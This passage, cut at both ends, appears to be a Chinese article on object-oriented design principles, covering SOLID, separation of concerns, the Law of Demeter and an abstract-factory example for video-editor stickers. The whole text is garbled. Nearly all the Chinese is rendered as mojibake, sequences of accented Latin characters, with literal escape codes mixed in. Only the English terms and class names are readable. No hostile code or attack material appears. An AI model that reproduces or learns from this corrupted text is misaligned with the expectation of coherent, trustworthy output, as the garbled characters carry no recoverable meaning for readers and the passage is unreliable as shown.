ä¿®æ”¹çš„å¤æ‚åº¦å’Œå‡ºé”™çš„æ¦‚ç‡ã€‚\nè®¾è®¡æ¨¡å¼ä¸­è¿˜æœ‰å¾ˆå¤šæ¨¡å¼éƒ½éµå®ˆäº†å•ä¸€èŒè´£åŸåˆ™ï¼Œä¾‹å¦‚æŠ½è±¡å·¥å‚å°†äº§å“å¯¹è±¡çš„æ„é€ è¿™ä¸€èŒè´£ç‹¬ç«‹å‡ºæ¥ï¼Œå®¢æˆ·çš„å¯ä»¥ç›´æ¥é€šè¿‡å·¥å‚æ¥å£æ‹¿åˆ°äº§å“æ¥å£ï¼Œè€Œæ— éœ€å…³å¿ƒå…·ä½“äº§å“æ˜¯å¦‚ä½•å®ç°ä»¥åŠå¦‚ä½•å®ä¾‹åŒ–çš„ï¼›å†æ¯”å¦‚æ¡¥æ¥æ¨¡å¼ï¼Œå°†æŠ½è±¡çš„è®¾è®¡éƒ¨åˆ†å’Œå®ƒæ‰€å€šèµ–çš„å®ç°éƒ¨åˆ†åˆ†ç¦»ï¼Œä½¿äºŒè€…å¯ä»¥ç‹¬ç«‹å‘ç”Ÿå˜åŒ–ï¼Œç­‰ç­‰ã€‚\nå¦ä¸€ä¸ªå¾ˆæœ‰ç”¨çš„æ¦‚å¿µæ˜¯åˆ†ç¦»å…³æ³¨ç‚¹ï¼Œè¿™ä¸ªæ¦‚å¿µå’Œå•ä¸€èŒè´£åŸåˆ™æœ‰ç‚¹ç±»ä¼¼ï¼Œä½†æ˜¯è§’åº¦ä¸å¤ªä¸€æ ·ã€‚å…·ä½“æˆ‘ä»¬åœ¨åˆ†ç¦»å…³æ³¨ç‚¹ç« èŠ‚ä¸­è¿›ä¸€æ­¥è®¨è®ºã€‚\nOpen-closed Principle å¼€é—­åŸåˆ™ ç³»ç»Ÿåº”è¯¥å¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å…³é—­ã€‚\nè¿™é‡Œçš„å…³é”®è¯æ˜¯â€œä¿®æ”¹â€ã€‚è½¯ä»¶ä¹‹æ‰€ä»¥è¦åšè®¾è®¡ï¼Œå¾ˆå¤§ç¨‹åº¦ä¸Šå°±æ˜¯å› ä¸ºéœ€è¦åº”å¯¹æœªæ¥çš„ä¿®æ”¹ï¼Œæ¢å¥è¯è¯´ï¼Œéœ€è¦åº”å¯¹æœªæ¥çš„å˜åŒ–ã€‚è¿™ç§å˜åŒ–åŒ…æ‹¬æ–°å¢éœ€æ±‚ä»¥åŠå¯¹ç°æœ‰éœ€æ±‚çš„ä¿®æ”¹ã€‚\nä¸ºäº†é€‚åº”è¿™ç§å˜åŒ–ï¼Œå¹¶ä¸”åœ¨é€‚åº”å˜åŒ–çš„åŒæ—¶ï¼Œä¿æŒç³»ç»Ÿçš„å¥å£®æ€§ï¼Œæˆ‘ä»¬å¿…é¡»è€ƒè™‘ç³»ç»Ÿåœ¨å®ƒçš„ç”Ÿå‘½å‘¨æœŸå†…ä¼šå‘ç”Ÿæ€æ ·çš„å˜åŒ–ã€‚ä¸€ä¸ªä¸è€ƒè™‘å˜åŒ–çš„è®¾è®¡ï¼Œåœ¨å°†æ¥å¾ˆå¯èƒ½éœ€è¦å¤§è§„æ¨¡é‡æ„ï¼Œè¿™æ„å‘³ç€é‡æ–°è®¾è®¡ã€å¼€å‘å’Œæµ‹è¯•ï¼Œä»¥åŠä¾èµ–æ–¹çš„ä¿®æ”¹ï¼Œè¿™ç§ä»£ä»·æ˜¯ååˆ†å·¨å¤§çš„ã€‚\nåšæŒå¼€é—­åŸåˆ™ä¸ä½†èƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬æ›´å¥½çš„é€‚åº”å˜åŒ–ï¼Œè€Œä¸”è¿˜æœ‰åŠ©äºæˆ‘ä»¬å»ºç«‹èµ·ç¨³å®šä¸”é«˜è´¨é‡çš„ã€è´§æ¶äº§å“ã€ã€‚è¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœæˆ‘ä»¬çš„ç»„ä»¶å¼€å‘å‡ºæ¥ä¹‹åï¼Œä¸éœ€è¦å› ä¸ºå®¢æˆ·çš„éœ€æ±‚è€Œæ—¶å¸¸å‘ç”Ÿä¿®æ”¹ï¼ˆåªæœ‰æ—¥å¸¸ç»´æŠ¤ã€bugfixï¼‰ï¼Œåœ¨å®¢æˆ·æœ‰æ–°çš„éœ€æ±‚æ—¶ï¼Œéƒ½æ˜¯é€šè¿‡æ‰©å±•ç°æœ‰ç»„ä»¶ï¼ˆç»§æ‰¿æˆ–ç»„åˆï¼‰ã€æ–°å¢ç»„ä»¶çš„æ–¹å¼æ¥æ»¡è¶³å®¢æˆ·è¯‰æ±‚ï¼Œé‚£ä¹ˆéšç€æ—¶é—´çš„æ¨ç§»ï¼Œçº¿ä¸Šçš„åœºæ™¯éªŒè¯ã€çº¿ä¸‹çš„æµ‹è¯•è¦†ç›–ä¼šè¶Šæ¥è¶Šå¤šï¼Œç°å­˜ç»„ä»¶çš„è´¨é‡å’Œç¨³å®šæ€§ä¼šè¶Šæ¥è¶Šé«˜ï¼ˆå› ä¸º bugfix åœ¨æŒç»­è¿›è¡Œï¼Œä¸”æ²¡æœ‰å¼•å…¥æ–°çš„ä¿®æ”¹ç‚¹ï¼‰ã€‚è¿™æ ·æŒç»­å‘å±•ä¸‹å»ï¼Œæˆ‘ä»¬å°±å¯ä»¥å»ºç«‹ä¸€ä¸ªé«˜è´¨é‡çš„ç»„ä»¶åº“ï¼Œå³æˆ‘ä»¬è¯´çš„ã€è´§æ¶äº§å“ã€ã€‚\nå½“ç„¶ï¼Œè¦åšåˆ°è¿™ä¸€ç‚¹å¹¶ä¸å®¹æ˜“ã€‚è¿™é‡Œæ•´ç†ä¸€ä¸ªå¤§è‡´çš„æ€è·¯ä¾›å‚è€ƒï¼š\næ‰¾å‡ºæ½œåœ¨çš„å˜åŒ–ç‚¹â€‹ã€‚åœ¨è®¾è®¡ä¹‹åˆï¼Œä»éœ€æ±‚è§’åº¦å‡ºå‘ï¼Œè€ƒå¯Ÿæ¨¡å—ä¸­å“ªäº›éƒ¨åˆ†å°†æ¥å¯èƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼ŒæŠŠè¿™äº›æ½œåœ¨çš„å˜åŒ–ç‚¹æ‰¾å‡ºæ¥ã€‚\nå¯¹å˜åŒ–è¿›è¡Œå°è£…å’Œéš”ç¦»â€‹ã€‚å˜åŒ–ç‚¹æ‰¾å‡ºæ¥ä¹‹åï¼Œæ€è€ƒä¸€ä¸‹ï¼Œå°†æ¥è¿™äº›å˜åŒ–çœŸæ­£æ¥ä¸´çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šå¦‚ä½•æ”¯æŒï¼Ÿ\næ˜¯å¦å¯ä»¥åœ¨ä¸ä¿®æ”¹ç°æœ‰æ¨¡å—ä»£ç çš„å‰æä¸‹ï¼ˆå¯ä»¥æ–°å¢ä»£ç ï¼Œä¾‹å¦‚æ–°å†™ä¸€ä¸ªç±»ï¼‰ï¼Œé€šè¿‡æŸç§æœºåˆ¶ä¼˜é›…çš„æ”¯æŒè¿™ç§å˜åŒ–ï¼Ÿä¾‹å¦‚åœ¨è¿è¡Œæ—¶æ›¿æ¢æŸä¸ªå¯¹è±¡ï¼Œæˆ–è€…æ–°å¢ä¸€ä¸ªå­ç±»æ¥è‡ªå®šä¹‰åŸºç±»çš„éƒ¨åˆ†è¡Œä¸ºï¼Ÿæƒ³æ¸…æ¥šè¿™ç‚¹ä¹‹åï¼Œæˆ‘ä»¬å°±å®ç°äº†å¯¹å˜åŒ–è¿›è¡Œå°è£…å’Œéš”ç¦»ã€‚\nä¸Šé¢æ˜¯ä¸€ä¸ªæ€è·¯ï¼Œå…·ä½“åº”è¯¥å¦‚ä½•åšå‘¢ï¼Ÿ è®¾è®¡æ¨¡å¼ä¸ºæˆ‘ä»¬æŒ‡æ˜äº†é“è·¯ã€‚\nâ€‹è®¾è®¡æ¨¡å¼å¯ä»¥ç¡®ä¿ç³»ç»Ÿèƒ½å¤Ÿä»¥æŸç§ç‰¹å®šçš„æ–¹å¼å‘ç”Ÿå˜åŒ–â€‹ï¼Œä»è€Œå¸®åŠ©ä½ åœ¨é¢ä¸´è¿™ç§å˜åŒ–æ—¶é¿å…é‡æ–°è®¾è®¡ã€‚æ¯ä¸€ä¸ªè®¾è®¡æ¨¡å¼éƒ½å…è®¸ç³»ç»Ÿç»“æ„çš„æŸä¸ªæ–¹é¢çš„å˜åŒ–ç‹¬ç«‹äºå…¶ä»–æ–¹é¢ï¼Œè¿™æ ·äº§ç”Ÿçš„ç³»ç»Ÿå¯ä»¥æ›´å¥½åœ°é€‚åº”è¿™ç§å˜åŒ–ï¼Œä»è€Œæ›´åŠ å¥å£®ã€‚è¿›ä¸€æ­¥çš„é˜è¿°è§å¸¸è§çš„è®¾è®¡é—®é¢˜åŠç›¸å…³æ¨¡å¼åº”ç”¨ã€è®¾è®¡æ¨¡å¼æ‰€æ”¯æŒçš„è®¾è®¡çš„å¯å˜æ–¹é¢ä¸¤èŠ‚ã€‚\nä¸€æ¬¾ä¸èƒ½é€‚åº”å˜åŒ–çš„è½¯ä»¶æ˜¯æ²¡æœ‰ç”Ÿå‘½åŠ›çš„ï¼Œè€Œä¸”æ³¨å®šä¼šä»¥å¤±è´¥å‘Šç»ˆï¼Œè®©æˆ‘ä»¬ç§¯ææ‹¥æŠ±å˜åŒ–ğŸ˜ã€‚\nLiskov Substitution Principle é‡Œæ°æ›¿æ¢åŸåˆ™ åŸºç±»å¯¹è±¡åº”è¯¥å¯ä»¥è¢«å­ç±»å¯¹è±¡æ— ç¼æ›¿æ¢ã€‚\né™¤äº†æ˜æ˜¾çš„å­—é¢æ„æ€ï¼Œè¿™é‡Œä»ã€åŸºç±»è®¾è®¡è€…ã€å’Œã€å­ç±»å®ç°è€…ã€ä¸¤ä¸ªè§’åº¦ï¼Œè¡¥å……ä¸€ç‚¹ä¸ªäººçš„ç†è§£ã€‚\nåŸºç±»è®¾è®¡è§’åº¦ åŸºç±»åœ¨è®¾è®¡æ—¶ï¼Œåº”è¯¥æ…é‡å®šä¹‰å¯é‡å†™ï¼ˆ overwrite ï¼‰æ–¹æ³•ã€‚æ¯ä¸ª overwrite æ–¹æ³•éƒ½åº”è¯¥æœ‰æ˜ç¡®çš„è®¾è®¡æ„å›¾ã€‚ åŸºç±»å®šä¹‰çš„æ¯ä¸€ä¸ª overwrite æ–¹æ³•ï¼Œéƒ½åº”è¯¥æ˜¯æœ‰æ„ä¸ºä¹‹ï¼Œä¸èƒ½éšä¾¿å®šä¹‰ã€‚ä¾‹å¦‚ï¼Œæ¨¡æ¿æ–¹æ³•ä¸­å¼€æ”¾å‡ºæ¥çš„ overwrite æ–¹æ³•ï¼Œæ˜¯æœ‰æ„è®©å­ç±»é‡å†™æ•´ä¸ªç®—æ³•æµç¨‹ä¸­çš„æŸäº›æ­¥éª¤ã€‚\næ…é‡å®šä¹‰ overwrite æ–¹æ³•ï¼Œå¯ä»¥æœ‰æ•ˆé˜²æ­¢ overwrite æ–¹æ³•è¯­ä¹‰æ··ä¹±ã€ç”¨é€”ä¸æ˜ç¡®ä»¥åŠå­ç±»é”™è¯¯é‡å†™çš„é—®é¢˜ï¼Œä¹Ÿå¯ä»¥é™ä½å­ç±»å®ç°è€…çš„å¿ƒæ™ºè´Ÿæ‹…ã€‚\nå­ç±»å®ç°è§’åº¦ å­ç±»åœ¨å®ç°æ—¶ï¼Œåº”è¯¥ç†è§£åŸºç±»çš„å·¥ä½œæœºåˆ¶ï¼Œéµå®ˆåŸºç±»çš„è®¾è®¡æ„å›¾ï¼Œä¸¥æ ¼æŒ‰ç…§ç»§æ‰¿åè®®æ¥é‡å†™ overwrite æ–¹æ³•ï¼Œå¹¶ç¡®ä¿éµå¾ªé‡Œæ°æ›¿æ¢åŸåˆ™ã€‚ Interface Segregation Principle æ¥å£éš”ç¦»åŸåˆ™ æä¾›å¤šä¸ªåˆ†ç¦»çš„æ¥å£ï¼Œè€Œéæä¾›ä¸€ä¸ªå®½æ³›ç”¨é€”çš„æ¥å£ã€‚\næä¾›éš”ç¦»çš„æ¥å£è‡³å°‘æœ‰ä¸¤æ–¹é¢çš„å¥½å¤„ï¼š\nä»ä½¿ç”¨è€…çš„è§’åº¦è®²ï¼Œäº’ç›¸éš”ç¦»æ¥å£çš„æ¥å£ç›¸è¾ƒä¸€ä¸ªå¤§è€Œå…¨çš„æ¥å£ï¼Œä½¿ç”¨èµ·æ¥æ›´åŠ ç®€å•ã€é«˜æ•ˆï¼Œå¯ä»¥æœ‰æ•ˆå‡å°‘è¯¯ç”¨ï¼ŒåŒæ—¶é™ä½ä½¿ç”¨è€…çš„å¿ƒæ™ºè´Ÿæ‹…ï¼› ä»è®¾è®¡è€…çš„è§’åº¦è®²ï¼Œæä¾›ç›¸äº’éš”ç¦»çš„æ¥å£é™¤äº†æœ‰åˆ©äºä¿æŒç»„ä»¶æ¥å£çš„ç®€æ´æ¸…æ™°ï¼ŒåŒæ—¶è¿˜ä¼šè¿«ä½¿è®¾è®¡è€…æ€è€ƒæ¸…æ¥šç³»ç»Ÿçš„æ ¸å¿ƒï¼ˆåŸå­ï¼‰æ¥å£æ˜¯ä»€ä¹ˆï¼Œä»è€Œåœ¨æœºåˆ¶å±‚é¢å¯¹ç³»ç»Ÿçš„è®¾è®¡æ€è€ƒçš„æ›´åŠ é€å½»ä¸€äº›ï¼Œè€Œä¸æ˜¯ case by case çš„æä¾›ä¸šåŠ¡æ‰€éœ€è¦çš„å„é¡¹åŠŸèƒ½ã€‚ å®é™…ä¸Šï¼Œç”±äºåˆ†ç¦»æ¥å£ä¹Ÿæ„å‘³ç€åˆ†ç¦»èŒè´£ï¼Œå› æ­¤è¯¥åŸåˆ™ä¹Ÿæš—åˆå•ä¸€èŒè´£åŸåˆ™ã€‚\nDependency Inversion Principle ä¾èµ–å€’ç½®åŸåˆ™ ä¾èµ–æŠ½è±¡ï¼Œä¸è¦ä¾èµ–å…·ä½“å®ç°ã€‚\né«˜å±‚ç»„ä»¶ä¸åº”è¯¥ä¾èµ–ä½å±‚ç»„ä»¶ ä¸ç®¡é«˜å±‚ç»„ä»¶æˆ–ä½å±‚ç»„ä»¶ï¼Œä¸¤è€…éƒ½åº”è¯¥ä¾èµ–æŠ½è±¡ï¼Œè€Œéå…·ä½“å®ç° è€ƒè™‘è¿™æ ·ä¸€ä¸ªä¾‹å­ï¼Œå‡è®¾æˆ‘ä»¬æœ‰ä¸€æ¬¾è§†é¢‘ç¼–è¾‘å™¨ï¼Œå…¶ä¸­æœ‰ä¸€é¡¹è´´çº¸åŠŸèƒ½ï¼Œå…è®¸ç”¨æˆ·é€‰æ‹©ä¸åŒç±»å‹çš„è´´çº¸ï¼Œæ¯”å¦‚æœ‰é™æ€è´´çº¸ã€åŠ¨æ€è´´çº¸ç­‰ã€‚\nå¤šç§è´´çº¸ç±»å‹æ„å‘³ç€æœ‰å¤šä¸ªè´´çº¸çš„å®ç°ç±»ï¼Œä¾‹å¦‚ï¼š\nStaticSticker æ”¯æŒå•å¼ å›¾ç‰‡çš„é™æ€è´´çº¸ AnimatedSticker æ”¯æŒå›¾ç‰‡åºåˆ—å¸§çš„åŠ¨æ€è´´çº¸ è´´çº¸ç±»å‹ä¸åŒï¼Œä½¿ç”¨æ–¹å¼ä¹Ÿæœ‰æ‰€ä¸åŒã€‚ä¾‹å¦‚ï¼Œé™æ€è´´çº¸åªéœ€ä¸€å¼ å›¾ç‰‡ï¼Œä»¥åŠè´´çº¸çš„ç»˜åˆ¶åŒºåŸŸã€èµ·å§‹æ—¶é—´ã€ç»“æŸæ—¶é—´ï¼›è€ŒåŠ¨æ€è´´çº¸éœ€è¦ä¸€ä¸ªåºåˆ—å¸§ï¼Œè€Œä¸”è¯¥åºåˆ—å¸§çš„æ—¶é—´é—´éš”å¯èƒ½æ˜¯å›ºå®šçš„ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸å›ºå®šçš„ã€‚å¦‚æœåœ¨ç¼–è¾‘å™¨çš„ä¸»ç¨‹åºä¸­ç›´æ¥ä½¿ç”¨è¿™ä¸¤ä¸ªæœªç»æŠ½è±¡çš„è´´çº¸å®ç°ç±»ï¼Œç»“æœå¯èƒ½æ˜¯ç¾éš¾æ€§çš„ï¼š\nç”±äºä¸»ç¨‹åºéœ€è¦å…³æ³¨å…·ä½“çš„è´´çº¸å®ç°ç±»ï¼Œå¯¼è‡´æˆ‘ä»¬åœ¨ä¸»ç¨‹åºä¸­å¼•å…¥äº†ä¸€ä¸ªæ–°çš„å¼•èµ·å˜åŒ–çš„åŸå› ï¼ˆå‚è€ƒå•ä¸€èŒè´£åŸåˆ™ï¼‰,åç»­éœ€è¦æ‰©å±•æ–°çš„è´´çº¸ï¼Œæˆ–è€…æŸä¸ªè´´çº¸å®ç°éœ€è¦è°ƒæ•´æ—¶ï¼Œéƒ½å¯èƒ½ä¼šå¼•èµ·ä¸»ç¨‹åºçš„ä¿®æ”¹ï¼› ç”±äºä¸åŒè´´çº¸çš„ä½¿ç”¨é€»è¾‘ï¼ˆæ¥å£ï¼‰å¯èƒ½ä¸åŒï¼Œä¸»ç¨‹åºä¸­å¯èƒ½ä¼šå……æ–¥ç€å„ç§ if else æˆ–è€… switch case çš„åˆ†æ”¯è¯­å¥ï¼Œåœ¨æ‰©å±•æ–°è´´çº¸ï¼Œæˆ–è€…è°ƒæ•´è´´çº¸å·¥ä½œæµç¨‹çš„æ—¶å€™ï¼Œä¼šå¼•å‘ Shotgun Surgery éœ°å¼¹å¼ä¿®æ”¹ (å‚è€ƒã€Šé‡æ„ã€‹3.6 ç« )ã€‚ å¦‚ä½•è§£å†³è¯¥é—®é¢˜ï¼Ÿç­”æ¡ˆå°±æ˜¯ ä¾èµ–å€’ç½® ã€‚æˆ‘ä»¬åº”è¯¥ä¾èµ– Sticker çš„æŠ½è±¡æ¥å£ï¼Œè€Œä¸èƒ½ç›´æ¥ä¾èµ–ä¸åŒè´´çº¸çš„å…·ä½“å®ç°ç±»ã€‚å…·ä½“å¦‚ä½•åšåˆ°å‘¢ï¼Ÿä¸‹é¢æä¾›ä¸€ä¸ªæ€è·¯ä¾›å‚è€ƒã€‚\nå¯¹è´´çº¸è¿›è¡ŒæŠ½è±¡è®¾è®¡ï¼Œå¾—åˆ°è´´çº¸æ¥å£ Sticker ä»”ç»†åˆ†æè´´çº¸çš„éœ€æ±‚ï¼Œæˆ‘ä»¬å‘ç°å¤§è‡´å¯ä»¥å®šä¹‰å‡ºå¦‚ä¸‹å‡ ä¸ªæ¥å£ï¼š\ngetStartTime() - è·å–èµ·å§‹æ—¶é—´ getEndTime() - è·å–ç»“æŸæ—¶é—´ getRect() - è·å–ç»˜åˆ¶åŒºåŸŸ getImageAtTime() - è·å–ä»»æ„æ—¶åˆ»çš„å›¾ç‰‡ æœ‰äº†ä¸Šè¿°å‡ ä¸ªæ¥å£ï¼Œä¸»ç¨‹åºå°±èƒ½å¤Ÿå®ç°åŸºæœ¬çš„è´´çº¸ç»˜åˆ¶æµç¨‹äº†ã€‚å› æ­¤ï¼Œä¸»ç¨‹åºå°±å¯ä»¥è„±ç¦»å¯¹è´´çº¸å…·ä½“å®ç°çš„ä¾èµ–ï¼Œè½¬å˜æˆä¾èµ–æŠ½è±¡æ¥å£ Sticker äº†ã€‚\næœ‰äº† Sticker ä¹‹åï¼Œæˆ‘ä»¬ä¼šå‘ç°å…¶å®è¿˜ä¸å¤ªå¤Ÿã€‚å› ä¸ºæˆ‘ä»¬ä»ç„¶éœ€è¦åœ¨ä¸»ç¨‹åºä¸­æ„é€ å‡ºå…·ä½“çš„æŸä¸ªè´´çº¸ï¼Œä¸åŒè´´çº¸çš„æ„é€ é€»è¾‘å¯èƒ½æ˜¯ä¸åŒçš„ï¼Œè€Œä¸”åç»­å¯èƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œå› æ­¤ï¼Œè¿™ä»ç„¶ä¼šå¯¼è‡´å¯¹å…·ä½“å®ç°çš„ä¾èµ–ã€‚å¦‚ä½•æ‘†è„±è¿™ç§ä¾èµ–ï¼Ÿæˆ‘ä»¬è¿›ä¸€æ­¥å°†å¯¹è±¡çš„æ„é€ è¿‡ç¨‹è¿›è¡ŒæŠ½è±¡ï¼ŒæŠ½è±¡å‡ºä¸€ä¸ª StickerFactory æ¥å£ï¼š\ncreateSticker(): Sticker åˆ›å»ºæŸç§ç±»å‹çš„è´´çº¸ï¼Œå¹¶è¿”å› Sticker æ¥å£ æœ‰äº†ä¸Šè¿°ä¸¤ä¸ªæ¥å£ï¼Œä¸»ç¨‹åºç®—æ˜¯å½»åº•æ‘†è„±äº†å¯¹è´´çº¸å…·ä½“å®ç°ç±»çš„ä¾èµ–äº†ï¼Œä¸”åŒæ–¹éƒ½å¯ä»¥ç‹¬ç«‹å¯¹å®ç°è¿›è¡Œè°ƒæ•´ï¼Œè€Œä¸ä¼šäº’ç›¸äº§ç”Ÿå½±å“ã€‚\nä¹Ÿè®¸ä½ å¯èƒ½ä¼šé—®ï¼Œé‚£ StickerFactory å¯¹è±¡åˆå¦‚ä½•æ„é€ å‘¢ï¼Ÿè¿™ä¸ªå¯¹è±¡å…¶å®å¯ä»¥å§”æ‰˜ç»™è´´çº¸é€‰æ‹©ç¨‹åºæ¥æ„é€ ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ç”¨æˆ·é€‰ä¸­æŸä¸€æ¬¾è´´çº¸æ—¶ï¼Œè¯¥è´´çº¸çš„ç±»å‹å…¶å®å·²ç»ç¡®å®šäº†ï¼Œåœ¨è¿™é‡Œå¯ä»¥æ°å½“çš„æ„é€ å‡ºå…·ä½“æ‰€éœ€è¦çš„ StickerFactory ï¼ˆ StaticStickerFactory æˆ–è€… AnimatedStickerFactory å®ä¾‹ï¼‰ã€‚\nè¿™ä¸ªä¾‹å­è®²å®Œäº†ï¼Œçœ‹èµ·æ¥æ˜¯ä¸æ˜¯å¾ˆçœ¼ç†Ÿï¼Ÿæ²¡é”™ï¼Œè¿™å°±æ˜¯æŠ½è±¡å·¥å‚æ¨¡å¼çš„ä¸€ä¸ªåº”ç”¨ã€‚ä¸‹é¢é™„ä¸Šè¿™ä¸ªä¾‹å­çš„ç±»å›¾ï¼Œæ–¹ä¾¿ç†è§£ï¼š\nSeparation of Concerns åˆ†ç¦»å…³æ³¨ç‚¹ åˆ†ç¦»å…³æ³¨ç‚¹æ˜¯æŒ‡å°†è½¯ä»¶åˆ’åˆ†ä¸ºè‹¥å¹²ä¸ªå½¼æ­¤ç‹¬ç«‹çš„å•å…ƒï¼Œæ¯ä¸ªå•å…ƒå¤„ç†ä¸€ä¸ªåˆ†ç¦»çš„å…³æ³¨ç‚¹ï¼Œä¸åŒå•å…ƒä¹‹é—´ä¿æŒéš”ç¦»ï¼Œä»…é€šè¿‡å®šä¹‰è‰¯å¥½çš„æ¥å£è¿›è¡Œé€šä¿¡ã€‚\nSeparation of Concerns , ç®€ç§° SoC ã€‚ç›¸æ¯”å•ä¸€èŒè´£åŸåˆ™æ¥è¯´ï¼Œæˆ‘è§‰å¾—åˆ†ç¦»å…³æ³¨ç‚¹çš„æ¦‚å¿µä¼šæ›´é€šç”¨åŒ–ä¸€äº›ï¼Œæ›´å¤šå¼ºè°ƒäº†å¦‚ä½•é™ä½å¼€å‘è€…çš„å¿ƒæ™ºè´Ÿæ‹…ã€‚ä¾‹å¦‚ï¼Œæˆ‘åœ¨å¼€å‘ A æ¨¡å—çš„æ—¶å€™ï¼Œå¯ä»¥ä¸ç”¨æ“å¿ƒå…¶ä»– B/C/D æ¨¡å—çš„ä»»ä½•ç»†èŠ‚ï¼Œå¯ä»¥ä¸“æ³¨æŠ•å…¥åˆ° A æ¨¡å—çš„å¼€å‘å·¥ä½œä¸Šï¼Œè¿™æ ·æ•ˆç‡æœ€é«˜ï¼Œè€Œä¸”ä¸å®¹æ˜“å‡ºé”™ã€‚\nå¦å¤–ï¼Œ SoC é™¤äº†è¡¨è¾¾å•ä¸€èŒè´£çš„å†…æ¶µï¼Œè¿˜éšå«äº†å•ä¸ªæ¨¡å—åº”è¯¥è¶³å¤Ÿå†…èšï¼Œæ¨¡å—ä¹‹é—´åº”è¯¥å°½é‡è§£è€¦ï¼Œåªèƒ½é€šè¿‡å®šä¹‰æ˜ç¡®çš„æ¥å£æ¥é€šä¿¡ç­‰æ„æ€ï¼Œå¦åˆ™æ˜¯åšä¸åˆ°åˆ†ç¦»å…³æ³¨ç‚¹çš„ã€‚\nè¿™ä¸ªæ¦‚å¿µå¯ä»¥æ¶µç›–åˆ°å¤šä¸ªä¸åŒçš„å±‚é¢ï¼Œå¯ä»¥å°åˆ°ä¸€ä¸ªå‡½æ•°ã€ä¸€ä¸ªç±»çš„åˆ’åˆ†ï¼Œå¤§åˆ°ä¸€ä¸ªæ¨¡å—ã€ä¸€ä¸ªå­ç³»ç»Ÿï¼Œä¹Ÿå¯ä»¥æ˜¯è½¯ä»¶çš„åˆ†å±‚è®¾è®¡ã€‚ä¾‹å¦‚ TCP/IP åè®®æ¨¡å‹ï¼Œå°±æ˜¯ä¸€ä¸ªå…¸å‹çš„ç¬¦åˆ SoC åŸåˆ™çš„è®¾è®¡ã€‚\nLaw of Demeter æœ€å°‘çŸ¥è¯†åŸåˆ™ ä¹Ÿå«è¿ªç±³ç‰¹æ³•åˆ™ï¼Œæ˜¯æŒ‡ä¸€ä¸ªå®ä½“åº”å½“å°½é‡å°‘åœ°ä¸å…¶ä»–å®ä½“ä¹‹é—´å‘ç”Ÿç›¸äº’ä½œç”¨ï¼Œä½¿å¾—ç³»ç»ŸåŠŸèƒ½æ¨¡å—ä¹‹é—´ç›¸å¯¹ç‹¬ç«‹ã€‚è¿™æ ·ï¼Œå½“ä¿®æ”¹æŸä¸€ä¸ªæ¨¡å—æ—¶ï¼Œå°±ä¼šå°½é‡å°‘çš„å½±å“åˆ°å…¶ä»–æ¨¡å—ï¼Œæ‰©å±•ä¹Ÿä¼šç›¸å¯¹æ›´åŠ å®¹æ˜“ã€‚\nè¿™å…¶å®æ˜¯å¯¹è½¯ä»¶å®ä½“ä¹‹é—´çš„é€šä¿¡è¿›è¡Œçº¦æŸï¼Œå…¶æœ¬è´¨æ˜¯è¦æ±‚æˆ‘ä»¬åœ¨è¿›è¡Œè½¯ä»¶è®¾è®¡æ—¶ï¼Œè¦åšåˆ°å®ä½“å†…éƒ¨çš„â€‹é«˜å†…èš, ä»¥åŠå®ä½“ä¹‹é—´çš„â€‹ä½è€¦åˆâ€‹ã€‚\nä¾‹å¦‚åœ¨ Android å¼€å‘è¿‡ç¨‹ä¸­ï¼Œå¦‚æœæ˜¯é‡‡ç”¨ MvvM æ¶æ„ï¼Œæ¯”è¾ƒå¥½çš„å®è·µæ˜¯å°½å¯èƒ½çš„æŠŠä½ çš„ Model å±‚é€»è¾‘ï¼Œç”šè‡³æ˜¯ ViewModel å±‚é€»è¾‘åšåˆ°å¹³å°æ— å…³ï¼Œå³ ä¿æŒå¯¹å¹³å°çš„æœ€å°‘çŸ¥è¯†ï¼ˆä¾èµ–),è¿™æ ·åšè‡³å°‘æœ‰å¦‚ä¸‹å¥½å¤„ï¼š\nå¯ä»¥ç¡®ä¿ä½ å°Šå¾ªäº† MvvM æ¶æ„è§„èŒƒï¼Œ Model \u0026 ViewModel å±‚ä¸ä¼šå¯¹ View å±‚æœ‰ç›´æ¥çš„ä¾èµ–ã€‚ ViewModel å’Œ View ä¹‹é—´ä»…ä¿æŒæ•°æ®å‘å¸ƒ/è®¢é˜…çš„å…³ç³»ï¼Œä¸å¯¹ View äº§ç”Ÿç›´æ¥ä¾èµ–ã€‚åœ¨ Android å¹³å°ï¼Œ é¿å… ViewModel å¯¹ View å±‚çš„ä¾èµ–ååˆ†å¿…è¦ï¼Œè¿™å¯ä»¥é¿å…å¾ˆå¤šç”Ÿå‘½å‘¨æœŸæ–¹é¢çš„é—®é¢˜ï¼ˆå› ä¸º ViewModel æ¯” View å±‚çš„å¯¹è±¡å¾€å¾€å…·æœ‰æ›´é•¿çš„ç”Ÿå‘½å‘¨æœŸï¼‰ã€‚ ä½ çš„ Model \u0026 ViewModel å’Œå¹³å°æ— å…³ï¼Œå…·å¤‡è¶³å¤Ÿçš„çµæ´»æ€§ã€‚ä¾‹å¦‚åœ¨ Android SDK å‘ç”Ÿå˜æ›´æˆ–è€…æ‰‹æœºå‚å•†è¡Œä¸ºä¸ä¸€è‡´æ—¶ï¼Œå¯ä»¥æ›´å®¹æ˜“çš„åœ¨ä¸Šå±‚åšé€‚é…ï¼Œè€Œæ— éœ€ä¿®æ”¹æ ¸å¿ƒä¸šåŠ¡é€»è¾‘ã€‚ æ•´ä¸ªç³»ç»Ÿçš„å¯æµ‹è¯•æ€§å°†å¤§å¹…æå‡ï¼Œ Model \u0026 ViewModel éƒ½å¯ä»¥è¿›è¡Œç‹¬ç«‹çš„å•å…ƒæµ‹è¯•ï¼Œè€Œä¸”è¿™ç§â€‹å•å…ƒæµ‹è¯•æ˜¯å¯ä»¥è„±ç¦» Android è®¾å¤‡æˆ–è€… Android æ¨¡æ‹Ÿå™¨ç‹¬ç«‹è¿›è¡Œâ€‹çš„ï¼Œå³å¯ä»¥ç›´æ¥åœ¨ PC ä¸Šè·‘ï¼Œæµ‹è¯•ã€è°ƒè¯•æ•ˆç‡ä¹Ÿå¾—åˆ°äº†å¤§å¹…æå‡ã€‚ å…³äº ViewModel çš„å•å…ƒæµ‹è¯•å¯ä»¥å‚è€ƒå®˜æ–¹çš„è¿™ç¯‡ Codelab ç¤ºä¾‹ã€‚\nComposite 